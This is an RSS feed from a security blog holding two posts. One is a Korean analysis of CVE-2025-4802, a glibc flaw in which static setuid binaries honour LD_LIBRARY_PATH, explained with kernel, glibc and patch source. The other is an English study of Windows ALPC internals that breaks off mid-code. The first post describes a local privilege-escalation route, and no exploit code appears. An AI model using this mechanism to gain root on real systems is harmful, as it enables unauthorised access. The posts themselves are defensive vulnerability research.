<?xml version="1.0" encoding="utf-8"?>
<rss version="2.0"
  xmlns:atom="http://www.w3.org/2005/Atom"
  xmlns:content="http://purl.org/rss/1.0/modules/content/">
  <channel>
    <title>hackyboiz</title>
    <link>https://hackyboiz.github.io/</link>
    
    <atom:link href="https://hackyboiz.github.io/rss2.xml" rel="self" type="application/rss+xml"/>
    
    <description>hack &amp; life</description>
    <pubDate>Wed, 03 Dec 2025 13:14:58 GMT</pubDate>
    <generator>http://hexo.io/</generator>
    
    <item>
      <title>[하루한줄] CVE-2025-4802 : GLIBC의 정적 setuid 바이너리에서 발생하는 임의 라이브러리 경로 취약점</title>
      <link>https://hackyboiz.github.io/2025/12/03/millet/cve-2025-4802/</link>
      <guid>https://hackyboiz.github.io/2025/12/03/millet/cve-2025-4802/</guid>
      <pubDate>Wed, 03 Dec 2025 08:00:00 GMT</pubDate>
      
        
        
      <description>&lt;h2 id=&quot;URL&quot;&gt;&lt;a href=&quot;#URL&quot; class=&quot;headerlink&quot; title=&quot;URL&quot;&gt;&lt;/a&gt;URL&lt;/h2&gt;&lt;ul&gt;
&lt;li&gt;&lt;a href=&quot;https://cyberpress.org/critical-glibc-flaw/&quot;&gt;https:</description>
        
      
      
      
      <content:encoded><![CDATA[<h2 id="URL"><a href="#URL" class="headerlink" title="URL"></a>URL</h2><ul><li><a href="https://cyberpress.org/critical-glibc-flaw/">https://cyberpress.org/critical-glibc-flaw/</a></li></ul><h2 id="Target"><a href="#Target" class="headerlink" title="Target"></a>Target</h2><ul><li>2.27&#xBD80;&#xD130; 2.38&#xAE4C;&#xC9C0;&#xC758; GNU C Library&#xB97C; &#xC0AC;&#xC6A9;&#xD558;&#xB294; &#xD658;&#xACBD;</li></ul><h2 id="Explain"><a href="#Explain" class="headerlink" title="Explain"></a>Explain</h2><h3 id="background"><a href="#background" class="headerlink" title="background"></a>background</h3><p>&#xC77C;&#xBC18;&#xC801;&#xC73C;&#xB85C; &#xB9AC;&#xB205;&#xC2A4;&#xC5D0;&#xC11C; setuid/setgid &#xAD8C;&#xD55C;&#xC774; &#xC801;&#xC6A9;&#xB41C; &#xBC14;&#xC774;&#xB108;&#xB9AC;&#xB97C; &#xC2E4;&#xD589;&#xD558;&#xBA74; &#xCEE4;&#xB110;&#xC740; <code>execve()</code> &#xB0B4;&#xBD80;&#xC5D0;&#xC11C; secure execution&#xC774;&#xB77C;&#xB294; &#xD2B9;&#xC218; &#xBAA8;&#xB4DC;&#xB97C; &#xD65C;&#xC131;&#xD654;&#xD569;&#xB2C8;&#xB2E4;. &#xC774; &#xACFC;&#xC815;&#xC5D0;&#xC11C; &#xCEE4;&#xB110;&#xC740; <code>bprm-&gt;secureexec = 1</code>&#xC744; &#xC124;&#xC815;[1]&#xD558;&#xACE0; ELF &#xBCF4;&#xC870; &#xBCA1;&#xD130;&#xC5D0; <code>AT_SECURE = 1</code> &#xAC12;&#xC744; &#xC0BD;&#xC785;[2]&#xD569;&#xB2C8;&#xB2E4;.</p><blockquote><p><strong>linux-6.17.9/security/commoncap.c</strong></p></blockquote><pre><code class="hljs c"><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">cap_bprm_creds_from_file</span><span class="hljs-params">(struct linux_binprm *bprm, <span class="hljs-keyword">const</span> struct file *file)</span></span>...<span class="hljs-comment">/* Check for privilege-elevated exec. */</span><span class="hljs-keyword">if</span> (id_changed ||    !uid_eq(<span class="hljs-keyword">new</span>-&gt;euid, old-&gt;uid) ||    !gid_eq(<span class="hljs-keyword">new</span>-&gt;egid, old-&gt;gid) ||    (!__is_real(root_uid, <span class="hljs-keyword">new</span>) &amp;&amp;     (effective ||      __cap_grew(permitted, ambient, <span class="hljs-keyword">new</span>))))bprm-&gt;secureexec = <span class="hljs-number">1</span>;                                                                                         <span class="hljs-comment">// [1]</span>...</code></pre><blockquote><p><strong>linux-6.17.9/fs/binfmt_elf.c</strong></p></blockquote><pre><code class="hljs c"><span class="hljs-keyword">static</span> <span class="hljs-keyword">int</span>create_elf_tables(struct linux_binprm *bprm, <span class="hljs-keyword">const</span> struct elfhdr *exec,<span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">long</span> interp_load_addr,<span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">long</span> e_entry, <span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">long</span> phdr_addr)...NEW_AUX_ENT(AT_SECURE, bprm-&gt;secureexec);                                                                       <span class="hljs-comment">// [2]</span>...</code></pre><p><code>AT_SECURE</code>&#xAC00; <code>1</code>&#xC774;&#xBA74; glibc&#xB294; secure mode&#xB85C; &#xC804;&#xD658;&#xD558;&#xC5EC; &#xB0B4;&#xBD80;&#xC801;&#xC73C;&#xB85C; <code>__libc_enable_secure = 1</code>&#xC744; &#xC124;&#xC815;[3]&#xD558;&#xACE0; <code>LD_LIBRARY_PATH</code>, <code>LD_PRELOAD</code>, <code>LD_AUDIT</code>&#xACFC; &#xAC19;&#xC740; &#xC704;&#xD5D8;&#xD55C; &#xD658;&#xACBD; &#xBCC0;&#xC218;&#xB97C; &#xBB34;&#xC2DC;[4]&#xD558;&#xAC8C; &#xB429;&#xB2C8;&#xB2E4;.</p><blockquote><p><strong>glibc-2.35/elf/dl-support.c</strong></p></blockquote><pre><code class="hljs c"><span class="hljs-keyword">void</span>_dl_aux_init (ElfW(<span class="hljs-keyword">auxv_t</span>) *av)...      <span class="hljs-keyword">case</span> AT_SECURE:seen = <span class="hljs-number">-1</span>;__libc_enable_secure = av-&gt;a_un.a_val;                                                                          <span class="hljs-comment">// [3]</span>__libc_enable_secure_decided = <span class="hljs-number">1</span>;<span class="hljs-keyword">break</span>;...</code></pre><blockquote><p><strong>glibc-2.35/elf/rtld.c</strong></p></blockquote><pre><code class="hljs c"><span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span>dl_main (<span class="hljs-keyword">const</span> ElfW(Phdr) *phdr, ElfW(Word) phnum, ElfW(Addr) *user_entry, ElfW(<span class="hljs-keyword">auxv_t</span>) *auxv)...  dl_main_state_init (&amp;state);...<span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span>dl_main_state_init (struct dl_main_state *state){  audit_list_init (&amp;state-&gt;audit_list);  state-&gt;library_path = <span class="hljs-literal">NULL</span>;  state-&gt;library_path_source = <span class="hljs-literal">NULL</span>;...<span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span>process_envvars (struct dl_main_state *state)...<span class="hljs-keyword">case</span> <span class="hljs-number">12</span>:  <span class="hljs-comment">/* The library search path.  */</span>  <span class="hljs-keyword">if</span> (!__libc_enable_secure                                                                                     <span class="hljs-comment">// [4]</span>      &amp;&amp; <span class="hljs-built_in">memcmp</span> (envline, <span class="hljs-string">&quot;LIBRARY_PATH&quot;</span>, <span class="hljs-number">12</span>) == <span class="hljs-number">0</span>)    {      state-&gt;library_path = &amp;envline[<span class="hljs-number">13</span>];      state-&gt;library_path_source = <span class="hljs-string">&quot;LD_LIBRARY_PATH&quot;</span>;      <span class="hljs-keyword">break</span>;    }...</code></pre><p>&#xD574;&#xB2F9; &#xD544;&#xD130;&#xB9C1;&#xC740; &#xD504;&#xB85C;&#xC138;&#xC2A4;&#xC758; &#xCD08;&#xAE30;&#xD654; &#xB8E8;&#xD2F4;&#xC5D0;&#xC11C; &#xC218;&#xD589;&#xB418;&#xBA70; &#xC774;&#xB85C; &#xC778;&#xD574; &#xC77C;&#xBC18; &#xC0AC;&#xC6A9;&#xC790;&#xAC00; setuid &#xBC14;&#xC774;&#xB108;&#xB9AC;&#xC5D0; &#xC784;&#xC758;&#xC758; &#xB77C;&#xC774;&#xBE0C;&#xB7EC;&#xB9AC; &#xACBD;&#xB85C;&#xB97C; &#xC804;&#xB2EC;&#xD568;&#xC73C;&#xB85C;&#xC368; root &#xAD8C;&#xD55C;&#xC744; &#xD68D;&#xB4DD;&#xD558;&#xB294; &#xACBD;&#xB85C;&#xAC00; &#xCC28;&#xB2E8;&#xB429;&#xB2C8;&#xB2E4;.</p><h3 id="root-cause"><a href="#root-cause" class="headerlink" title="root cause"></a>root cause</h3><p>&#xD574;&#xB2F9; &#xCDE8;&#xC57D;&#xC810;&#xC758; &#xACBD;&#xC6B0; glibc&#xC758; <code>__libc_enable_secure</code> &#xAC12;&#xC744; &#xC774;&#xC6A9;&#xD55C; &#xD658;&#xACBD; &#xBCC0;&#xC218; &#xD544;&#xD130;&#xB9C1; &#xB85C;&#xC9C1;&#xC774; &#xB3D9;&#xC801; &#xB85C;&#xB354;&#xC758; &#xCD08;&#xAE30;&#xD654; &#xD568;&#xC218;&#xC778; <code>dl_main()</code> &#xC5D0;&#xC11C;&#xB9CC; &#xC801;&#xC6A9;&#xB418;&#xC5B4; &#xC788;&#xC5C8;&#xAE30; &#xB54C;&#xBB38;&#xC5D0; &#xBC1C;&#xC0DD;&#xD558;&#xC600;&#xC2B5;&#xB2C8;&#xB2E4;.</p><p>&#xC815;&#xC801; &#xB9C1;&#xD06C;&#xB41C; &#xBC14;&#xC774;&#xB108;&#xB9AC;&#xB294; &#xB3D9;&#xC801; &#xB85C;&#xB354;&#xB97C; &#xC0AC;&#xC6A9;&#xD558;&#xC9C0; &#xC54A;&#xAE30; &#xB54C;&#xBB38;&#xC5D0; <code>_dl_non_dynamic_init()</code> &#xD568;&#xC218;&#xB97C; &#xD1B5;&#xD574; &#xB77C;&#xC774;&#xBE0C;&#xB7EC;&#xB9AC; &#xACBD;&#xB85C;&#xB97C; &#xC124;&#xC815;[5]&#xD558;&#xB294;&#xB370; &#xD574;&#xB2F9; &#xD568;&#xC218;&#xC5D0;&#xC11C;&#xB294; <code>__libc_enable_secure</code> &#xAC12;&#xC5D0; &#xB530;&#xB978; &#xD658;&#xACBD; &#xBCC0;&#xC218; &#xD544;&#xD130;&#xB9C1;&#xC774; &#xBBF8;&#xD761;&#xD588;&#xC2B5;&#xB2C8;&#xB2E4;.</p><blockquote><p><strong>glibc-2.35/elf/dl-support.c</strong></p></blockquote><pre><code class="hljs c"><span class="hljs-keyword">void</span>_dl_non_dynamic_init (<span class="hljs-keyword">void</span>){...  <span class="hljs-comment">/* Initialize the data structures for the search paths for shared</span><span class="hljs-comment">     objects.  */</span>  _dl_init_paths (getenv (<span class="hljs-string">&quot;LD_LIBRARY_PATH&quot;</span>), <span class="hljs-string">&quot;LD_LIBRARY_PATH&quot;</span>,                                                  <span class="hljs-comment">// [5]</span>  <span class="hljs-comment">/* No glibc-hwcaps selection support in statically</span><span class="hljs-comment">     linked binaries.  */</span>  <span class="hljs-literal">NULL</span>, <span class="hljs-literal">NULL</span>);...</code></pre><p>&#xC774;&#xB85C; &#xC778;&#xD574; &#xCEE4;&#xB110;&#xC774; secure execution &#xBAA8;&#xB4DC;&#xB97C; &#xD65C;&#xC131;&#xD654;&#xD558;&#xB354;&#xB77C;&#xB3C4; <code>dlopen()</code>&#xB4F1;&#xC758; &#xD568;&#xC218; &#xD638;&#xCD9C;&#xC5D0;&#xC11C; &#xD658;&#xACBD; &#xBCC0;&#xC218; &#xAE30;&#xBC18;&#xC758; &#xACBD;&#xB85C;&#xB97C; &#xADF8;&#xB300;&#xB85C; &#xC0AC;&#xC6A9;&#xD558;&#xAC8C; &#xB418;&#xC5B4; &#xACF5;&#xACA9;&#xC790;&#xAC00; <code>LD_LIBRARY_PATH</code> &#xD658;&#xACBD; &#xBCC0;&#xC218;&#xC5D0; &#xC81C;&#xC5B4; &#xAC00;&#xB2A5;&#xD55C; &#xB514;&#xB809;&#xD130;&#xB9AC;&#xB97C; &#xC124;&#xC815;&#xD558;&#xBA74; setuid &#xBC14;&#xC774;&#xB108;&#xB9AC;&#xAC00; &#xACF5;&#xACA9;&#xC790;&#xC758; &#xB77C;&#xC774;&#xBE0C;&#xB7EC;&#xB9AC;&#xB97C; &#xB85C;&#xB4DC;&#xD560; &#xC218; &#xC788;&#xAC8C; &#xB429;&#xB2C8;&#xB2E4;.</p><h3 id="patch"><a href="#patch" class="headerlink" title="patch"></a>patch</h3><p>&#xD328;&#xCE58; &#xCEE4;&#xBC0B; <code>5451fa962cd0a90a0e2ec1d8910a559ace02bba0</code>&#xC5D0;&#xC11C; <code>__libc_enable_secure</code> &#xAC12;&#xC744; &#xD1B5;&#xD574; &#xD658;&#xACBD; &#xBCC0;&#xC218;&#xB97C; &#xD544;&#xD130;&#xB9C1;[6]&#xD55C; &#xD6C4; &#xB77C;&#xC774;&#xBE0C;&#xB7EC;&#xB9AC; &#xACBD;&#xB85C;&#xB97C; &#xB85C;&#xB4DC;[7]&#xD558;&#xB3C4;&#xB85D; &#xBCC0;&#xACBD;&#xB418;&#xC5C8;&#xC2B5;&#xB2C8;&#xB2E4;.</p><blockquote><p><strong>glibc-2.39/elf/dl-support.c</strong></p></blockquote><pre><code class="hljs c"><span class="hljs-keyword">void</span>_dl_non_dynamic_init (<span class="hljs-keyword">void</span>){  _dl_main_map.l_origin = _dl_get_origin ();  _dl_main_map.l_phdr = GL(dl_phdr);  _dl_main_map.l_phnum = GL(dl_phnum);  <span class="hljs-comment">/* Set up the data structures for the system-supplied DSO early,</span><span class="hljs-comment">     so they can influence _dl_init_paths.  */</span>  setup_vdso (<span class="hljs-literal">NULL</span>, <span class="hljs-literal">NULL</span>);  <span class="hljs-comment">/* With vDSO setup we can initialize the function pointers.  */</span>  setup_vdso_pointers ();  <span class="hljs-keyword">if</span> (__libc_enable_secure)                                                                                       <span class="hljs-comment">// [6]</span>    {      <span class="hljs-keyword">static</span> <span class="hljs-keyword">const</span> <span class="hljs-keyword">char</span> unsecure_envvars[] =UNSECURE_ENVVARS;      <span class="hljs-keyword">const</span> <span class="hljs-keyword">char</span> *cp = unsecure_envvars;      <span class="hljs-keyword">while</span> (cp &lt; unsecure_envvars + <span class="hljs-keyword">sizeof</span> (unsecure_envvars)){  __unsetenv (cp);  cp = <span class="hljs-built_in">strchr</span> (cp, <span class="hljs-string">&apos;\0&apos;</span>) + <span class="hljs-number">1</span>;}    }...  <span class="hljs-comment">/* Initialize the data structures for the search paths for shared</span><span class="hljs-comment">     objects.  */</span>  _dl_init_paths (getenv (<span class="hljs-string">&quot;LD_LIBRARY_PATH&quot;</span>), <span class="hljs-string">&quot;LD_LIBRARY_PATH&quot;</span>,                                                  <span class="hljs-comment">// [7]</span>  <span class="hljs-comment">/* No glibc-hwcaps selection support in statically</span><span class="hljs-comment">     linked binaries.  */</span>  <span class="hljs-literal">NULL</span>, <span class="hljs-literal">NULL</span>);...</code></pre><h2 id="Reference"><a href="#Reference" class="headerlink" title="Reference"></a>Reference</h2><ul><li><a href="https://www.man7.org/linux/man-pages/man3/getauxval.3.html">https://www.man7.org/linux/man-pages/man3/getauxval.3.html</a></li><li><a href="https://ubuntu.com/security/CVE-2025-4802">https://ubuntu.com/security/CVE-2025-4802</a></li><li><a href="https://cyberpress.org/critical-glibc-flaw/">https://cyberpress.org/critical-glibc-flaw/</a></li><li><a href="https://articles.manugarg.com/aboutelfauxiliaryvectors">https://articles.manugarg.com/aboutelfauxiliaryvectors</a></li><li><a href="https://patchwork.yoctoproject.org/project/oe-core/patch/20250611113400.2146584-1-sunilkumar.dora@windriver.com/#28605">https://patchwork.yoctoproject.org/project/oe-core/patch/20250611113400.2146584-1-sunilkumar.dora@windriver.com/#28605</a></li></ul>]]></content:encoded>
      
      
      <category domain="https://hackyboiz.github.io/categories/1day1line/">1day1line</category>
      
      
      <category domain="https://hackyboiz.github.io/tags/millet/">millet</category>
      
      <category domain="https://hackyboiz.github.io/tags/glibc/">glibc</category>
      
      <category domain="https://hackyboiz.github.io/tags/static-link/">static link</category>
      
      <category domain="https://hackyboiz.github.io/tags/environment-variable/">environment variable</category>
      
      <category domain="https://hackyboiz.github.io/tags/CVE-2025-4802/">CVE-2025-4802</category>
      
      
      <comments>https://hackyboiz.github.io/2025/12/03/millet/cve-2025-4802/#disqus_thread</comments>
      
    </item>
    
    <item>
      <title>[Research] Windows ALPC (EN)</title>
      <link>https://hackyboiz.github.io/2025/11/29/gongjae/Windows_ALPC/EN/</link>
      <guid>https://hackyboiz.github.io/2025/11/29/gongjae/Windows_ALPC/EN/</guid>
      <pubDate>Sat, 29 Nov 2025 12:00:00 GMT</pubDate>
      
        
        
      <description>&lt;h2 id=&quot;Introduction&quot;&gt;&lt;a href=&quot;#Introduction&quot; class=&quot;headerlink&quot; title=&quot;Introduction&quot;&gt;&lt;/a&gt;Introduction&lt;/h2&gt;&lt;p&gt;Hello! I&amp;#x2019;m &lt;code&gt;gongja</description>
        
      
      
      
      <content:encoded><![CDATA[<h2 id="Introduction"><a href="#Introduction" class="headerlink" title="Introduction"></a>Introduction</h2><p>Hello! I&#x2019;m <code>gongjae</code>, a new member who recently joined HackyBoiz! &#x1F47B;</p><p>During my time as a trainee at HackyBoiz, I had a question related to the Kernel Driver and Named Pipe bug hunting project I had previously worked on.</p><p><img src="image.png" alt="image.png"></p><p><del>Nope</del></p><p>Actually, I already knew that ALPC is one of the IPC communication methods, but I decided to take this opportunity to study it properly. </p><p>So today, we&#x2019;ll explore the concept of ALPC, its communication flow, and how messages are transmitted &#x2014; all while debugging it directly! :)</p><p><img src="image%201.png" alt="image.png"></p><h2 id="1-About-ALPC"><a href="#1-About-ALPC" class="headerlink" title="1. About ALPC"></a>1. About ALPC</h2><p>In the Windows environment, IPC mechanisms that can be used both remotely and locally include Named Pipes and RPC. However, ALPC is unique in that it can only be used locally.</p><p>While RPC stands for Remote Procedure Call, ALPC stands for Advanced Local Procedure Call and is sometimes also referred to as Asynchronous Local Call.</p><p>The term &#x201C;asynchronous&#x201D; reflects the Windows Vista era, during which ALPC was introduced to replace the existing LPC mechanism.</p><p>ALPC enables high-speed message communication and is used for data transmission between processes.</p><h3 id="1-1-LPC-to-ALPC"><a href="#1-1-LPC-to-ALPC" class="headerlink" title="1.1. LPC to ALPC"></a>1.1. LPC to ALPC</h3><p><img src="image%202.png" alt="image.png"></p><p>Before Windows Vista, LPC was an undocumented internal IPC mechanism provided by the Microsoft Windows NT kernel, used for lightweight communication between processes on the same machine.</p><p>Due to LPC&#x2019;s synchronous nature, both the client and server had to wait until a message was processed, which resulted in continuous blocking and performance issues.</p><p>As a result, from Windows Vista onward, the existing LPC mechanism was effectively reimplemented on top of ALPC, and later versions of Windows internally rely on ALPC as the core IPC mechanism. However, LPC APIs themselves did not completely disappear; rather, their internal implementation was redirected to ALPC.</p><p>&#x1F4A1;As seen in the image below, existing functions for creating LPC ports remain, but internally they are redirected to create ALPC ports instead. @.@</p><p><img src="image%203.png" alt="image.png"></p><h3 id="1-2-ALPC-Internal-Structure"><a href="#1-2-ALPC-Internal-Structure" class="headerlink" title="1.2. ALPC Internal Structure"></a>1.2. ALPC Internal Structure</h3><p>The main component of ALPC communication is the ALPC port object, and its usage is similar to a network socket.</p><p>&#x2192; The server opens a socket that clients can connect to in order to exchange messages.</p><p>Using Sysinternals Suite&#x2019;s WinObj.exe, we can inspect ALPC ports.</p><p><img src="image%204.png" alt="image.png"></p><p>Although some ALPC ports exist in the root path, most of them are located under the \RPC Control path.</p><p>In ALPC communication, three ALPC ports are involved (2 on the server side, 1 on the client side). The ALPC ports shown in WinObj are ALPC Communication Ports that clients can connect to.</p><p>Before explaining the communication process, let&#x2019;s briefly go over some important functions we will repeatedly encounter.</p><blockquote><p><strong>NtAlpcCreatePort()</strong></p></blockquote><pre><code class="hljs cpp"><span class="hljs-function">NTSTATUS NTAPI <span class="hljs-title">NtAlpcCreatePort</span><span class="hljs-params">(</span></span><span class="hljs-function"><span class="hljs-params">    OUT PHANDLE PortHandle,</span></span><span class="hljs-function"><span class="hljs-params">    IN POBJECT_ATTRIBUTES ObjectAttributes,</span></span><span class="hljs-function"><span class="hljs-params">    IN OUT PALPC_INFO PortInformation OPTIONAL</span></span><span class="hljs-function"><span class="hljs-params">)</span></span>;</code></pre><ul><li>This function is used to create an ALPC port. Unlike LPC, instead of listing options individually, ALPC bundles them into an ALPC_INFO structure and passes it as the final parameter.</li><li>This structure is copied into the ALPC object when the port is created and later referenced internally.</li></ul><pre><code class="hljs cpp"><span class="hljs-keyword">typedef</span> <span class="hljs-class"><span class="hljs-keyword">struct</span> _<span class="hljs-title">ALPC_INFO</span></span><span class="hljs-class">{</span><span class="hljs-meta">#<span class="hljs-meta-keyword">define</span> PORT_INFO_LPCMODE               0x001000 <span class="hljs-comment">// Operate like an LPC port</span></span><span class="hljs-meta">#<span class="hljs-meta-keyword">define</span> PORT_INFO_CANIMPERSONATE        0x010000 <span class="hljs-comment">// Allow impersonation</span></span><span class="hljs-meta">#<span class="hljs-meta-keyword">define</span> PORT_INFO_REQUEST_ALLOWED       0x020000 <span class="hljs-comment">// Allow message requests</span></span><span class="hljs-meta">#<span class="hljs-meta-keyword">define</span> PORT_INFO_SEMAPHORE             0x040000 <span class="hljs-comment">// Enable synchronization mechanism</span></span><span class="hljs-meta">#<span class="hljs-meta-keyword">define</span> PORT_INFO_HANDLE_EXPOSE         0x080000 <span class="hljs-comment">// Allow handle exposure</span></span><span class="hljs-meta">#<span class="hljs-meta-keyword">define</span> PORT_INFO_PARENT_SYSTEM_PRACESS 0x100000 <span class="hljs-comment">// Kernel ALPC interface (system process parent)</span></span>    ULONG Flags;    SECURITY_QUALITY_OF_SERVICE PortQos;    ULONG MaxMessageSize;    ULONG unknown1;    CHAR  cReserved1[<span class="hljs-number">8</span>];    ULONG MaxViewSize;    CHAR  cReserved2[<span class="hljs-number">8</span>];} ALPC_INFO, *PALPC_INFO;</code></pre><blockquote><p><strong>NtAlpcConnectPort()</strong></p></blockquote><pre><code class="hljs cpp"><span class="hljs-function">NTSTATUS NTAPI <span class="hljs-title">NtAlpcConnectPort</span><span class="hljs-params">(</span></span><span class="hljs-function"><span class="hljs-params">    OUT PHANDLE PortHandle,</span></span><span class="hljs-function"><span class="hljs-params">    IN PUNICODE_STRING PortName,</span></span><span class="hljs-function"><span class="hljs-params">    IN POBJECT_ATTRIBUTES ObjectAttributes,</span></span><span class="hljs-function"><span class="hljs-params">    IN PALPC_INFO PortInformation OPTIONAL,</span></span><span class="hljs-function"><span class="hljs-params">    IN DWORD ConnectionFlags,</span></span><span class="hljs-function"><span class="hljs-params">    IN PSID pSid OPTIONAL,</span></span><span class="hljs-function"><span class="hljs-params">    IN PLPC_MESSAGE ConnectionMessage OPTIONAL,</span></span><span class="hljs-function"><span class="hljs-params">    IN OUT PULONG ConnectMessageSize OPTIONAL,</span></span><span class="hljs-function"><span class="hljs-params">    IN PVOID InMessageBuffer OPTIONAL,</span></span><span class="hljs-function"><span class="hljs-params">    IN PVOID OutMessageBuffer OPTIONAL,</span></span><span class="hljs-function"><span class="hljs-params">    IN PLARGE_INTEGER Timeout OPTIONAL</span></span><span class="hljs-function"><span class="hljs-params">)</span></span>;</code></pre><ul><li>The PortName parameter specifies the name of the port to connect to, along with various optional settings. The kernel searches for the ALPC Connection Port object with the given name and then proceeds to request a connection.</li></ul><p><strong>Important ConnectionFlags values</strong></p><pre><code class="hljs cpp"><span class="hljs-meta">#<span class="hljs-meta-keyword">define</span> ALPC_SYNC_CONNECTION   0x020000 <span class="hljs-comment">// Synchronous connection</span></span><span class="hljs-meta">#<span class="hljs-meta-keyword">define</span> ALPC_USER_WAIT_MODE    0x100000 <span class="hljs-comment">// Wait in user mode</span></span><span class="hljs-meta">#<span class="hljs-meta-keyword">define</span> ALPC_WAIT_IS_ALERTABLE 0x200000 <span class="hljs-comment">// Alertable wait</span></span></code></pre><ul><li>By default, the connection is asynchronous.<ul><li>This means the client can obtain a handle <strong>before</strong> the server has actually processed and accepted the connection request.</li><li>So if the client sends a message while the server hasn&#x2019;t handled the connection yet, it can result in an error.</li></ul></li></ul><blockquote><p><strong>NtAlpcSendWaitReceivePort()</strong></p></blockquote><pre><code class="hljs cpp"><span class="hljs-function">NTSTATUS <span class="hljs-title">NtAlpcSendWaitReceivePort</span><span class="hljs-params">(</span></span><span class="hljs-function"><span class="hljs-params">    HANDLE PortHandle,</span></span><span class="hljs-function"><span class="hljs-params">    DWORD Flags,</span></span><span class="hljs-function"><span class="hljs-params">    PPORT_MESSAGE SendMessage,</span></span><span class="hljs-function"><span class="hljs-params">    PALPC_MESSAGE_ATTRIBUTES SendMessageAttributes,</span></span><span class="hljs-function"><span class="hljs-params">    PPORT_MESSAGE ReceiveMessage,</span></span><span class="hljs-function"><span class="hljs-params">    PSIZE_T BufferLength,</span></span><span class="hljs-function"><span class="hljs-params">    PALPC_MESSAGE_ATTRIBUTES ReceiveMessageAttributes,</span></span><span class="hljs-function"><span class="hljs-params">    PLARGE_INTEGER Timeout</span></span><span class="hljs-function"><span class="hljs-params">)</span></span>;</code></pre><ul><li>This is the most important function: with this single function, you can send and receive messages at the same time!!</li><li>SendMessage, ReceiveMessage are literally the send/receive message buffers.</li><li>SendMessageAttributes, ReceiveMessageAttributes are used to request or receive extra actions along with the message (section mapping, passing handles, etc.).</li></ul><h2 id="2-ALPC-Communication-Flow"><a href="#2-ALPC-Communication-Flow" class="headerlink" title="2. ALPC Communication Flow"></a>2. ALPC Communication Flow</h2><p>Alright, now that we roughly know what each function does, let&#x2019;s look at the actual communication flow. Earlier, I mentioned that an ALPC communication scenario involves <strong>three</strong> ALPC ports:</p><ol><li>The ALPC connection port created by the server process</li><li>The ALPC server communication port newly created by the kernel when a client connects</li><li>The ALPC client communication port</li></ol><p>We use these three, but just listing them like this doesn&#x2019;t make it very intuitive&#x2026;</p><p><del>At least it didn&#x2019;t for me&#x3160;</del></p><p>In reality, it <em>looks</em> like three logical ports exist during ALPC communication, but under the hood it&#x2019;s more like multiple endpoints being created on top of a single ALPC port object.</p><p>Let&#x2019;s walk through the communication flow step by step!</p><p><img src="image%205.png" alt="[&#xBAA8;&#xB4E0; &#xAC83;&#xC744; &#xD0C0;&#xD611;&#xD558;&#xAE30; &#xC704;&#xD574; N&#xC77C; &#xCCB4;&#xC778;: 2&#xBD80; &#x2014; Windows &#xCEE4;&#xB110; LPE (&#xC77C;&#xBA85; &#xD06C;&#xB86C; &#xC0CC;&#xB4DC;&#xBC15;&#xC2A4; Escape) - Theori BLOG](https://theori.io/blog/chaining-n-days-to-compromise-all-part-2-windows-kernel-lpe-a-k-a-chrome-sandbox-escape)"></p><p><a href="https://theori.io/blog/chaining-n-days-to-compromise-all-part-2-windows-kernel-lpe-a-k-a-chrome-sandbox-escape">&#xBAA8;&#xB4E0; &#xAC83;&#xC744; &#xD0C0;&#xD611;&#xD558;&#xAE30; &#xC704;&#xD574; N&#xC77C; &#xCCB4;&#xC778;: 2&#xBD80; &#x2014; Windows &#xCEE4;&#xB110; LPE (&#xC77C;&#xBA85; &#xD06C;&#xB86C; &#xC0CC;&#xB4DC;&#xBC15;&#xC2A4; Escape) - Theori BLOG</a></p><p>The function we should pay the most attention to is, again, <code>NtAlpcSendWaitReceivePort()</code>. This guy is basically responsible for all the request/response message exchange. In order, the flow looks like this:</p><ol><li>The server process calls <code>NtAlpcCreatePort()</code> to create an ALPC port.<ul><li>Example name: <code>\RPC Control\HackyBoiz</code></li></ul></li><li><p>The kernel creates the ALPC port object and returns a handle to the server.</p><p> &#x2192; This is the <strong>ALPC Connection Port!</strong></p></li><li><p>The server calls <code>NtAlpcSendWaitReceivePort()</code> and waits for a client connection.</p></li><li>The client calls <code>NtAlpcConnectPort()</code>.<ul><li>Name of the server port to connect to: <code>\RPC Control\HackyBoiz</code></li><li>(Optional) Initial message to send to the server</li><li>(Optional) Server SID to verify it&#x2019;s talking to the correct server</li><li>(Optional) Additional message attributes</li></ul></li><li>This connection request is delivered to the server, and the server calls <code>NtAlpcAcceptConnectPort()</code> to either accept or reject the connection.<ul><li>The last argument is a boolean: <code>TRUE</code> means accept, <code>FALSE</code> means reject.</li></ul></li><li>If the connection is accepted, the kernel creates a new ALPC Communication Port and returns handles to both the server and the client.</li><li>From this point on, messages are no longer sent through the Connection Port, but through this new Communication Port.</li></ol><p>Now it&#x2019;s starting to make a bit more sense, right?</p><p>Good. Then let&#x2019;s actually debug it and see it in action.</p><p>You can grab an example ALPC implementation here:</p><p><a href="https://github.com/DownWithUp/ALPC-Example">https://github.com/DownWithUp/ALPC-Example</a></p><p>We&#x2019;ll run this code and walk through the communication process ourselves! XD</p><blockquote><p>Server.c</p></blockquote><pre><code class="hljs cpp"><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;Windows.h&gt;</span></span><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;winternl.h&gt;</span></span><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;stdio.h&gt;</span></span><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&quot;ntalpcapi.h&quot;</span></span><span class="hljs-meta">#<span class="hljs-meta-keyword">pragma</span> comment(lib, <span class="hljs-meta-string">&quot;ntdll.lib&quot;</span>)</span><span class="hljs-meta">#<span class="hljs-meta-keyword">define</span> MAX_MSG_LEN 0x500</span><span class="hljs-function">LPVOID <span class="hljs-title">AllocMsgMem</span><span class="hljs-params">(SIZE_T Size)</span></span><span class="hljs-function"></span>{    <span class="hljs-keyword">return</span>(HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, Size + <span class="hljs-keyword">sizeof</span>(PORT_MESSAGE)));}<span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">CreatePortAndListen</span><span class="hljs-params">(LPCWSTR PortName)</span></span><span class="hljs-function"></span>{    ALPC_PORT_ATTRIBUTES    serverPortAttr;    OBJECT_ATTRIBUTES       objPort;    UNICODE_STRING          usPortName;    PORT_MESSAGE            pmRequest;    PORT_MESSAGE            